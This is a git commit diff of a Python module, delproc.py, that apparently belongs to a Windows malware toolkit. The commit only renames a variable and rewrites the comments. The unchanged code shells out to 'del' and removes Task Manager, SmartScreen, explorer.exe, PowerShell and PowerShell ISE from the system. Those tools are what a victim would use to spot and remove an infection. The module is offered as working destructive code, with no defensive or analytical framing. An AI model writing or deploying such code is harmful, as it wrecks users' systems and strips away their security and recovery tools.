797e38425875d04a6c79a52d05a4485854cd86aa
T-wcs <70718793+T-wcs@users.noreply.github.com>
2020-12-13 00:12:45 +0100

    Update delproc.py

--- modules/system/delproc.py
+++ modules/system/delproc.py
@@ -3,8 +3,8 @@
 import os, sys
 
 # ENVIRONMENT VARIABLE
-letter_drive_path = os.environ["SystemDrive"]
-current_user      = os.environ["USERNAME"]
+letter_drive = os.environ["SystemDrive"]
+current_user = os.environ["USERNAME"]
 
 class Kill():
     """ Class that allows to kill processes """
@@ -32,18 +32,18 @@ class Remove():
     """ Class that allows to delete processes """
     def __init__(self):
         self.ex = "del"
-        self.r1 = "{}\\Windows\\System32\\".format(letter_drive_path)
-    # Function to delete process in the directory specified
+        self.r1 = "{}\\Windows\\System32\\".format(letter_drive)
+    # FUNCTION TO DELETE THE TASKMANAGER AND SMARTSCREEN
     def stsk(self):
         procs = ['taskmgr.exe', 'smartscreen.exe']
         for proc in procs:
             ex = "{} {}{}".format(self.ex, self.r1, proc)
             os.system(ex)
-    # Function to delete gui process on windows
+    # FUNCTION TO DELETE EXPLORER.EXE
     def exp(self):
         cmd = "{} \\windows\\explorer.exe ".format(self.ex)
         os.system(cmd)
-    # Function to delete the powershell
+    # FUNCTION TO DELETE POWERSHELL
     def power(self):
         pwr_sh = ['powershell.exe', 'powershell_ise.exe']
         for proc in pwr_sh:
